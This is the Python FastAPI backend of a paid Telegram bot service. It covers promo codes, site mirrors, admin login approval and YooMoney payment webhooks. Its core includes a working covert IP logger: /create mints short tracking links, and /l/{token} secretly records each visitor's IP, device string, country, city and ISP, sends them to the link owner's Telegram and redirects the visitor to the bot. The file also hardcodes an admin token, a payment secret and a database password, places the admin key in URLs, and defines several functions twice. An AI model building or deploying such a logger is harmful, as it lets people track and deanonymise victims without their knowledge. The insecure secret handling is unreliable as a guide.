import os
import json
import asyncio
import asyncpg
import hashlib
import logging
from datetime import datetime, timedelta
from contextlib import asynccontextmanager
from typing import Optional, AsyncGenerator

import aiohttp
from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse, StreamingResponse
from pydantic import BaseModel

# -- Config
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://botuser:botpass123@localhost/botdb")
ADMIN_TOKEN = os.getenv("ADMIN_TOKEN", "BratokBB")
BOT_TOKEN = os.getenv("TOKEN", "")
NOTIFY_ADMINS = [int(x) for x in os.getenv("ADMINS", "8316051968,60693380,8701067595").split(",") if x.strip()]
YM_SECRET = os.getenv("YM_SECRET", "uEyXCRwqs60eoUFLfvUI9cNt")
BOT_LOGS = int(os.getenv("BOT_LOGS", "8316051968"))

# sub type → days (mirrors _SUB_MAP in main.py)
_YM_SUB_DAYS = {
    "1": 1,
    "3": 3,
    "7": 7,
    "30": 30,
    "forever": 999,
    "premupgrade": 0,  # premium flag, not days
}

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

# -- DB pool
pool: asyncpg.Pool = None

# -- SSE registry
_sse_queues: set = set()


async def init_site_tables(conn):
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS site_mirrors (
            id SERIAL PRIMARY KEY,
            name TEXT NOT NULL,
            url TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'active',
            sort_order INT NOT NULL DEFAULT 0,
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS site_reviews (
            id SERIAL PRIMARY KEY,
            author TEXT NOT NULL,
            text TEXT NOT NULL,
            avatar TEXT,
            visible BOOLEAN NOT NULL DEFAULT TRUE,
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS site_promos (
            id SERIAL PRIMARY KEY,
            title TEXT NOT NULL,
            code TEXT NOT NULL,
            description TEXT,
            expires_at TIMESTAMPTZ,
            active BOOLEAN NOT NULL DEFAULT TRUE,
            days INT NOT NULL DEFAULT 1,
            activations INT NOT NULL DEFAULT 100,
            promo_type TEXT NOT NULL DEFAULT 'normal',
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS admin_logins (
            id SERIAL PRIMARY KEY,
            ip TEXT NOT NULL,
            user_agent TEXT,
            ua_hash TEXT,
            geo TEXT DEFAULT '',
            logged_at TIMESTAMPTZ DEFAULT NOW(),
            status TEXT DEFAULT 'pending'
        )
    """)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS admin_blocklist (
            id SERIAL PRIMARY KEY,
            ip TEXT NOT NULL UNIQUE,
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS logger_links (
            id SERIAL PRIMARY KEY,
            token VARCHAR(32) UNIQUE NOT NULL,
            owner_id BIGINT NOT NULL,
            bot_token TEXT NOT NULL DEFAULT '',
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    try:
        await conn.execute("ALTER TABLE logger_links ADD COLUMN IF NOT EXISTS bot_token TEXT NOT NULL DEFAULT ''")
    except Exception:
        pass
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS pay_links (
            token VARCHAR(64) PRIMARY KEY,
            url TEXT NOT NULL,
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    await conn.execute("""
        CREATE TABLE IF NOT EXISTS logger_hits (
            id SERIAL PRIMARY KEY,
            token VARCHAR(32) NOT NULL,
            owner_id BIGINT NOT NULL,
            ip TEXT,
            user_agent TEXT,
            country TEXT,
            city TEXT,
            isp TEXT,
            notified BOOLEAN DEFAULT FALSE,
            created_at TIMESTAMPTZ DEFAULT NOW()
        )
    """)
    # Migrate: add new columns to existing table
    for col, definition in [
        ("days", "INT NOT NULL DEFAULT 1"),
        ("activations", "INT NOT NULL DEFAULT 100"),
        ("promo_type", "TEXT NOT NULL DEFAULT 'normal'"),
    ]:
        try:
            await conn.execute(f"ALTER TABLE site_promos ADD COLUMN IF NOT EXISTS {col} {definition}")
        except Exception:
            pass


@asynccontextmanager
async def lifespan(app: FastAPI):
    global pool
    pool = await asyncpg.create_pool(DATABASE_URL, min_size=2, max_size=10)
    async with pool.acquire() as conn:
        await init_site_tables(conn)
    log.info("DB pool ready")
    yield
    await pool.close()


app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["https://br-v2.top", "https://www.br-v2.top"],
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["Content-Type", "Authorization"],
)


class MirrorIn(BaseModel):
    name: str
    url: str
    status: str = "active"
    sort_order: int = 0


class ReviewIn(BaseModel):
    author: str
    text: str
    avatar: Optional[str] = None
    visible: bool = True


class PromoIn(BaseModel):
    title: str
    code: str
    description: Optional[str] = None
    expires_at: Optional[str] = None
    active: bool = True
    days: int = 1
    activations: int = 100
    promo_type: str = "normal"


# IP-based brute-force protection: 3 fails → 1h block
_fail_counts: dict = {}
_block_until: dict = {}

def _get_ip(request: Request) -> str:
    return request.headers.get("X-Forwarded-For", request.client.host).split(",")[0].strip()

async def _is_blocked(ip: str) -> bool:
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT 1 FROM admin_blocklist WHERE ip=$1", ip)
        return row is not None

def require_admin(request: Request):
    import time
    ip = _get_ip(request)
    now = time.time()
    if ip in _block_until and _block_until[ip] > now:
        raise HTTPException(status_code=429, detail="Too many attempts. Try again later.")
    auth = request.headers.get("Authorization", "")
    if len(auth) > 300:
        raise HTTPException(status_code=400, detail="Bad request")
    if not auth.startswith("Bearer ") or auth[7:] != ADMIN_TOKEN:
        _fail_counts[ip] = _fail_counts.get(ip, 0) + 1
        if _fail_counts[ip] >= 3:
            _block_until[ip] = now + 3600
            del _fail_counts[ip]
            raise HTTPException(status_code=429, detail="Too many attempts. Try again later.")
        raise HTTPException(status_code=401, detail="Unauthorized")
    _fail_counts.pop(ip, None)
    _block_until.pop(ip, None)

async def _get_geo(ip: str) -> str:
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp", timeout=aiohttp.ClientTimeout(total=3)) as r:
                if r.status == 200:
                    d = await r.json()
                    return f"{d.get('country','?')}, {d.get('city','?')} / {d.get('isp','?')}"
    except Exception:
        pass
    return "—"

async def _notify_admin_login(ip, ua, login_id, geo):
    if not BOT_TOKEN:
        return
    from datetime import timezone, timedelta
    msk = datetime.now(timezone(timedelta(hours=3))).strftime("%d.%m.%Y %H:%M:%S")
    lock = chr(0x1F510)
    text = (
        lock + " *Вход в админ панель*\n\n"
        "*IP:* `" + ip + "`\n"
        "*Гео:* `" + geo + "`\n"
        "*Устройство:* `" + ua[:200] + "`\n"
        "*Время (МСК):* `" + msk + "`\n"
        "*ID сессии:* `" + str(login_id) + "`"
    )
    btn_ok = chr(0x2705) + " Подтвердить"
    btn_blk = chr(0x1F6AB) + " Заблокировать"
    base = "https://br-v2.top/api/admin/confirm-action/" + str(login_id)
    key = ADMIN_TOKEN
    kb = {
        "inline_keyboard": [[
            {"text": btn_ok, "url": base + "?action=ok&key=" + key},
            {"text": btn_blk, "url": base + "?action=block&key=" + key}
        ]]
    }
    import aiohttp as _h
    async with _h.ClientSession() as s:
        for aid in NOTIFY_ADMINS:
            try:
                await s.post(
                    "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage",
                    json={"chat_id": aid, "text": text, "parse_mode": "Markdown", "reply_markup": kb}
                )
            except Exception:
                pass

# -- SSE helpers

async def _fetch_promos_json(conn) -> str:
    rows = await conn.fetch(
        "SELECT id, title, code, description, expires_at, active, days, activations, promo_type "
        "FROM site_promos ORDER BY id DESC"
    )
    return json.dumps([dict(r) for r in rows], default=str)


async def _broadcast_promos():
    if not _sse_queues:
        return
    async with pool.acquire() as conn:
        data = await _fetch_promos_json(conn)
    dead = set()
    for q in list(_sse_queues):
        try:
            q.put_nowait(data)
        except asyncio.QueueFull:
            dead.add(q)
    _sse_queues.difference_update(dead)


async def _sync_to_bot_promo(conn, code: str, days: int, activations: int, promo_type: str, active: bool):
    """Keep bot promocode table in sync with site_promos."""
    upper = code.upper()
    # Always remove old entry first (table may lack UNIQUE constraint)
    await conn.execute("DELETE FROM promocode WHERE UPPER(code) = $1", upper)
    if active:
        await conn.execute(
            "INSERT INTO promocode (code, days, activations, promo_type) VALUES ($1, $2, $3, $4)",
            upper, days, activations, promo_type,
        )


# -- Public endpoints

@app.get("/api/stats")
async def get_stats():
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT COUNT(*) as cnt FROM users")
        count = row["cnt"] if row else 0
    return {"users": count}


@app.get("/api/mirrors")
async def get_mirrors():
    async with pool.acquire() as conn:
        rows = await conn.fetch(
            "SELECT id, name, url, status FROM site_mirrors ORDER BY sort_order, id"
        )
    return [dict(r) for r in rows]


@app.get("/api/reviews")
async def get_reviews():
    async with pool.acquire() as conn:
        rows = await conn.fetch(
            "SELECT id, author, text, avatar, created_at FROM site_reviews WHERE visible=TRUE ORDER BY id DESC"
        )
    return [dict(r) for r in rows]


@app.get("/api/promos")
async def get_promos():
    async with pool.acquire() as conn:
        rows = await conn.fetch(
            "SELECT id, title, code, description, expires_at, active, days, activations, promo_type "
            "FROM site_promos ORDER BY id DESC"
        )
    return [dict(r) for r in rows]


@app.get("/api/promos/stream")
async def promos_stream(request: Request):
    """SSE — pushes updated promo list to all open tabs instantly."""
    q: asyncio.Queue = asyncio.Queue(maxsize=20)
    _sse_queues.add(q)

    async def generator():
        try:
            async with pool.acquire() as conn:
                data = await _fetch_promos_json(conn)
            yield f"data: {data}\n\n"
            while True:
                if await request.is_disconnected():
                    break
                try:
                    data = await asyncio.wait_for(q.get(), timeout=20)
                    yield f"data: {data}\n\n"
                except asyncio.TimeoutError:
                    yield ": keepalive\n\n"
        finally:
            _sse_queues.discard(q)

    return StreamingResponse(
        generator(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
            "Connection": "keep-alive",
        },
    )




async def _is_blocked(ip: str) -> bool:
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT 1 FROM admin_blocklist WHERE ip=$1", ip)
        return row is not None


async def _get_geo(ip: str) -> str:
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(
                f"http://ip-api.com/json/{ip}?fields=country,city,isp",
                timeout=aiohttp.ClientTimeout(total=3)
            ) as r:
                if r.status == 200:
                    d = await r.json()
                    return f"{d.get('country','?')}, {d.get('city','?')}"  + " / " + d.get('isp','?')
    except Exception:
        pass
    return "—"


async def _notify_admin_login(ip: str, ua: str, login_id: int, geo: str):
    if not BOT_TOKEN:
        return
    from datetime import timezone, timedelta
    msk = datetime.now(timezone(timedelta(hours=3))).strftime("%d.%m.%Y %H:%M:%S")
    text = (
        "🔐 *Вход в админ панель*\n\n"
        f"*IP:* `{ip}`\n"
        f"*Гео:* `{geo}`\n"
        f"*Устройство:* `{ua[:200]}`\n"
        f"*Время (МСК):* `{msk}`\n"
        f"*ID сессии:* `{login_id}`"
    )
    kb = {
        "inline_keyboard": [[
            {"text": "✅ Подтвердить", "url": f"https://br-v2.top/api/admin/confirm-action/{login_id}?action=ok&key={ADMIN_TOKEN}"},
            {"text": "🚫 Заблокировать", "url": f"https://br-v2.top/api/admin/confirm-action/{login_id}?action=block&key={ADMIN_TOKEN}"}
        ]]
    }
    async with aiohttp.ClientSession() as s:
        for admin_id in NOTIFY_ADMINS:
            try:
                await s.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": admin_id, "text": text, "parse_mode": "Markdown", "reply_markup": kb}
                )
            except Exception:
                pass


async def _notify_and_geo(ip: str, ua: str, login_id: int):
    geo = await _get_geo(ip)
    async with pool.acquire() as conn:
        await conn.execute("UPDATE admin_logins SET geo=$1 WHERE id=$2", geo, login_id)
    await _notify_admin_login(ip, ua, login_id, geo)


# -- Admin: ping (auth check + login notification)

@app.get("/api/admin/ping")
async def admin_ping(request: Request, _=Depends(require_admin)):
    ip = _get_ip(request)
    # Check DB blocklist
    if await _is_blocked(ip):
        raise HTTPException(status_code=403, detail="Blocked")
    ua = request.headers.get("User-Agent", "")[:500]
    # If no bot token configured — auto-confirm immediately (no Telegram notification)
    if not BOT_TOKEN:
        async with pool.acquire() as conn:
            row = await conn.fetchrow(
                "INSERT INTO admin_logins (ip, user_agent, status) VALUES ($1, $2, 'confirmed') RETURNING id",
                ip, ua
            )
        from fastapi.responses import JSONResponse
        return JSONResponse(status_code=202, content={"status": "confirmed", "login_id": row["id"]})
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "INSERT INTO admin_logins (ip, user_agent) VALUES ($1, $2) RETURNING id",
            ip, ua
        )
    login_id = row["id"]
    asyncio.create_task(_notify_and_geo(ip, ua, login_id))
    from fastapi.responses import JSONResponse
    return JSONResponse(status_code=202, content={"status": "pending", "login_id": login_id})

async def _notify_and_geo(ip: str, ua: str, login_id: int):
    geo = await _get_geo(ip)
    async with pool.acquire() as conn:
        await conn.execute("UPDATE admin_logins SET geo=$1 WHERE id=$2", geo, login_id)
    await _notify_admin_login(ip, ua, login_id, geo)

@app.post("/api/admin/block-ip/{login_id}", dependencies=[Depends(require_admin)])
async def block_ip(login_id: int):
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT ip FROM admin_logins WHERE id=$1", login_id)
        if not row:
            raise HTTPException(404, "Login not found")
        await conn.execute(
            "INSERT INTO admin_blocklist (ip) VALUES ($1) ON CONFLICT (ip) DO NOTHING",
            row["ip"]
        )
        await conn.execute("UPDATE admin_logins SET status='blocked' WHERE id=$1", login_id)
    return {"ok": True}

@app.post("/api/admin/confirm-login/{login_id}", dependencies=[Depends(require_admin)])
async def confirm_login(login_id: int):
    async with pool.acquire() as conn:
        await conn.execute("UPDATE admin_logins SET status='confirmed' WHERE id=$1", login_id)
    return {"ok": True}


@app.get("/api/admin/check-session/{login_id}")
async def check_session(login_id: int, authorization: str = ""):
    from fastapi import Header
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT status FROM admin_logins WHERE id=$1", login_id)
    if not row:
        raise HTTPException(status_code=404, detail="Not found")
    return {"status": row["status"]}


@app.get("/api/admin/confirm-action/{login_id}")
async def confirm_action_get(login_id: int, action: str = "", key: str = ""):
    from fastapi.responses import HTMLResponse
    if key != ADMIN_TOKEN:
        return HTMLResponse("<h2>❌ Неверный ключ</h2>", status_code=403)
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT ip FROM admin_logins WHERE id=$1", login_id)
        if not row:
            return HTMLResponse("<h2>❌ Сессия не найдена</h2>", status_code=404)
        ip = row["ip"]
        if action == "ok":
            await conn.execute("UPDATE admin_logins SET status='confirmed' WHERE id=$1", login_id)
            return HTMLResponse(f"<h2>✅ Вход подтверждён</h2><p>ID: {login_id} | IP: {ip}</p>")
        elif action == "block":
            await conn.execute("UPDATE admin_logins SET status='blocked' WHERE id=$1", login_id)
            await conn.execute(
                "INSERT INTO admin_blocklist (ip) VALUES ($1) ON CONFLICT (ip) DO NOTHING", ip
            )
            return HTMLResponse(f"<h2>🚫 IP заблокирован</h2><p>{ip}</p>")
        else:
            return HTMLResponse("<h2>❌ Неизвестное действие</h2>", status_code=400)


# -- Admin: mirrors

@app.post("/api/admin/mirrors", dependencies=[Depends(require_admin)])
async def create_mirror(body: MirrorIn):
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "INSERT INTO site_mirrors (name, url, status, sort_order) VALUES ($1,$2,$3,$4) RETURNING *",
            body.name, body.url, body.status, body.sort_order
        )
    return dict(row)


@app.put("/api/admin/mirrors/{mid}", dependencies=[Depends(require_admin)])
async def update_mirror(mid: int, body: MirrorIn):
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "UPDATE site_mirrors SET name=$1, url=$2, status=$3, sort_order=$4 WHERE id=$5 RETURNING *",
            body.name, body.url, body.status, body.sort_order, mid
        )
    if not row:
        raise HTTPException(404, "Not found")
    return dict(row)


@app.delete("/api/admin/mirrors/{mid}", dependencies=[Depends(require_admin)])
async def delete_mirror(mid: int):
    async with pool.acquire() as conn:
        await conn.execute("DELETE FROM site_mirrors WHERE id=$1", mid)
    return {"ok": True}


# -- Admin: reviews

@app.post("/api/admin/reviews", dependencies=[Depends(require_admin)])
async def create_review(body: ReviewIn):
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "INSERT INTO site_reviews (author, text, avatar, visible) VALUES ($1,$2,$3,$4) RETURNING *",
            body.author, body.text, body.avatar, body.visible
        )
    return dict(row)


@app.put("/api/admin/reviews/{rid}", dependencies=[Depends(require_admin)])
async def update_review(rid: int, body: ReviewIn):
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            "UPDATE site_reviews SET author=$1, text=$2, avatar=$3, visible=$4 WHERE id=$5 RETURNING *",
            body.author, body.text, body.avatar, body.visible, rid
        )
    if not row:
        raise HTTPException(404, "Not found")
    return dict(row)


@app.delete("/api/admin/reviews/{rid}", dependencies=[Depends(require_admin)])
async def delete_review(rid: int):
    async with pool.acquire() as conn:
        await conn.execute("DELETE FROM site_reviews WHERE id=$1", rid)
    return {"ok": True}


# -- Admin: promos

@app.post("/api/admin/promos", dependencies=[Depends(require_admin)])
async def create_promo(body: PromoIn):
    expires = None
    if body.expires_at:
        try:
            expires = datetime.fromisoformat(body.expires_at)
        except Exception:
            pass
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            """
            INSERT INTO site_promos (title, code, description, expires_at, active, days, activations, promo_type)
            VALUES ($1, $2, $3, $4, $5, $6, $7, $8) RETURNING *
            """,
            body.title, body.code.upper(), body.description, expires,
            body.active, body.days, body.activations, body.promo_type,
        )
        await _sync_to_bot_promo(conn, body.code, body.days, body.activations, body.promo_type, body.active)
    asyncio.create_task(_broadcast_promos())
    return dict(row)


@app.put("/api/admin/promos/{pid}", dependencies=[Depends(require_admin)])
async def update_promo(pid: int, body: PromoIn):
    expires = None
    if body.expires_at:
        try:
            expires = datetime.fromisoformat(body.expires_at)
        except Exception:
            pass
    async with pool.acquire() as conn:
        row = await conn.fetchrow(
            """
            UPDATE site_promos
            SET title=$1, code=$2, description=$3, expires_at=$4, active=$5,
                days=$6, activations=$7, promo_type=$8
            WHERE id=$9 RETURNING *
            """,
            body.title, body.code.upper(), body.description, expires,
            body.active, body.days, body.activations, body.promo_type, pid,
        )
        if not row:
            raise HTTPException(404, "Not found")
        await _sync_to_bot_promo(conn, body.code, body.days, body.activations, body.promo_type, body.active)
    asyncio.create_task(_broadcast_promos())
    return dict(row)


@app.delete("/api/admin/promos/{pid}", dependencies=[Depends(require_admin)])
async def delete_promo(pid: int):
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT code FROM site_promos WHERE id=$1", pid)
        await conn.execute("DELETE FROM site_promos WHERE id=$1", pid)
        if row:
            await conn.execute("DELETE FROM promocode WHERE code=$1", row["code"])
    asyncio.create_task(_broadcast_promos())
    return {"ok": True}


# -- Existing: IP logger


# ─── Pay-link registry (persistent in DB) ────────────────────────────────────

class PayIn(BaseModel):
    url: str


@app.post("/register_pay")
async def register_pay(body: PayIn):
    import secrets
    token = secrets.token_urlsafe(12)
    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO pay_links (token, url) VALUES ($1, $2) ON CONFLICT (token) DO UPDATE SET url=$2",
            token, body.url
        )
    return {"token": token}


@app.get("/pay/{token}")
async def pay_redirect(token: str):
    from fastapi.responses import RedirectResponse
    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT url FROM pay_links WHERE token=$1", token)
    if not row:
        raise HTTPException(status_code=404, detail="link expired")
    return RedirectResponse(row["url"])


@app.get("/create/{owner_id}")
async def create_link(owner_id: str, request: Request, token: str = ""):
    import secrets
    link_token = secrets.token_urlsafe(4)
    try:
        owner_int = int(owner_id)
    except ValueError:
        raise HTTPException(status_code=400, detail="invalid owner_id")
    # Use passed bot token, fallback to env
    bot_tok = token or BOT_TOKEN
    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO logger_links (token, owner_id, bot_token) VALUES ($1, $2, $3)",
            link_token, owner_int, bot_tok
        )
    url = f"https://br-v2.top/l/{link_token}"
    log.info(f"logger link created: owner={owner_id} token={link_token}")
    return {"url": url}


@app.get("/l/{token}")
async def logger_hit(token: str, request: Request):
    from fastapi.responses import RedirectResponse
    ip = request.headers.get("X-Forwarded-For", request.client.host)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")

    async with pool.acquire() as conn:
        row = await conn.fetchrow("SELECT owner_id, bot_token FROM logger_links WHERE token=$1", token)

    if not row:
        return RedirectResponse("https://t.me/Brrown_V2bot")

    owner_id = row["owner_id"]
    effective_bot_token = row["bot_token"] or BOT_TOKEN

    country, city, isp = "—", "—", "—"
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(
                f"http://ip-api.com/json/{ip}?fields=country,city,isp",
                timeout=aiohttp.ClientTimeout(total=4)
            ) as r:
                if r.status == 200:
                    geo = await r.json()
                    country = geo.get("country", "—")
                    city = geo.get("city", "—")
                    isp = geo.get("isp", "—")
    except Exception:
        pass

    async with pool.acquire() as conn:
        await conn.execute(
            "INSERT INTO logger_hits (token, owner_id, ip, user_agent, country, city, isp) VALUES ($1,$2,$3,$4,$5,$6,$7)",
            token, owner_id, ip, ua[:300], country, city, isp
        )

    def _h(t: str) -> str:
        return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

    msg = (
        "🔗 <b>Логгер сработал!</b>\n\n"
        f"🌐 <b>IP:</b> <code>{_h(ip)}</code>\n"
        f"🏳️ <b>Страна:</b> {_h(country)}\n"
        f"🏙 <b>Город:</b> {_h(city)}\n"
        f"📡 <b>Провайдер:</b> {_h(isp)}\n"
        f"📱 <b>UA:</b> <code>{_h(ua[:80])}</code>"
    )
    try:
        async with aiohttp.ClientSession() as s:
            await s.post(
                f"https://api.telegram.org/bot{effective_bot_token}/sendMessage",
                json={"chat_id": owner_id, "text": msg, "parse_mode": "HTML"},
                timeout=aiohttp.ClientTimeout(total=5)
            )
    except Exception as e:
        log.warning(f"logger notify failed: {e}")

    return RedirectResponse("https://t.me/Brrown_V2bot")


@app.post("/hook")
async def ym_notify(request: Request):
    """YooMoney merchant notification webhook.
    Docs: https://yoomoney.ru/docs/payment-buttons/using-api/notifications
    SHA1 = notification_type&operation_id&amount&currency&datetime&sender&codepro&secret&label
    """
    form = await request.form()
    notification_type = form.get("notification_type", "")
    operation_id     = form.get("operation_id", "")
    amount           = form.get("amount", "")
    currency         = form.get("currency", "")
    dt               = form.get("datetime", "")
    sender           = form.get("sender", "")
    codepro          = form.get("codepro", "")
    label            = form.get("label", "")
    sha1_received    = form.get("sha1_hash", "")

    # Verify signature
    secret = YM_SECRET
    sha1_str = f"{notification_type}&{operation_id}&{amount}&{currency}&{dt}&{sender}&{codepro}&{secret}&{label}"
    sha1_expected = hashlib.sha1(sha1_str.encode("utf-8")).hexdigest()
    if secret and sha1_received != sha1_expected:
        log.warning(f"[ym-notify] bad SHA1: expected={sha1_expected} got={sha1_received}")
        raise HTTPException(status_code=400, detail="bad signature")

    # label format: sub_{user_id}_{sub_type}
    if not label.startswith("sub_"):
        return {"ok": True}

    parts = label.split("_", 2)
    if len(parts) != 3:
        return {"ok": True}

    _, uid_str, st = parts
    try:
        uid = int(uid_str)
    except ValueError:
        return {"ok": True}

    if st not in _YM_SUB_DAYS:
        log.warning(f"[ym-notify] unknown sub type: {st}")
        return {"ok": True}

    sub_days = _YM_SUB_DAYS[st]

    async with pool.acquire() as conn:
        if st == "premupgrade":
            await conn.execute("UPDATE users SET premium=1 WHERE user_id=$1", uid)
            msg_text = "✅ *Ваш Premium активирован\\!*"
            log_text = f"💳 *Premium* `{uid}` через СБП/YM"
        else:
            current = await conn.fetchval("SELECT subscribe FROM users WHERE user_id=$1", uid)
            now = datetime.now()
            if current and current > now:
                new_date = current + timedelta(days=sub_days)
            else:
                new_date = now + timedelta(days=sub_days)
            await conn.execute(
                "UPDATE users SET subscribe=$1, sub_expiry_notified=FALSE WHERE user_id=$2",
                new_date, uid
            )
            new_date_str = new_date.strftime("%Y-%m-%d %H:%M:%S")
            msg_text = f"✅ *Подписка активирована\\!*\n*└─ Действует до: `{new_date_str}`*"
            log_text = f"💳 *Оплата СБП/YM* `{uid}` *до* `{new_date_str}`"

    tok = BOT_TOKEN
    try:
        async with aiohttp.ClientSession() as s:
            await s.post(
                f"https://api.telegram.org/bot{tok}/sendMessage",
                json={"chat_id": uid, "text": msg_text, "parse_mode": "MarkdownV2"},
                timeout=aiohttp.ClientTimeout(total=5)
            )
            await s.post(
                f"https://api.telegram.org/bot{tok}/sendMessage",
                json={"chat_id": BOT_LOGS, "text": log_text, "parse_mode": "Markdown"},
                timeout=aiohttp.ClientTimeout(total=5)
            )
    except Exception as e:
        log.warning(f"[ym-notify] tg notify failed: {e}")

    log.info(f"[ym-notify] granted sub={st} days={sub_days} uid={uid} op={operation_id}")
    return {"ok": True}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)
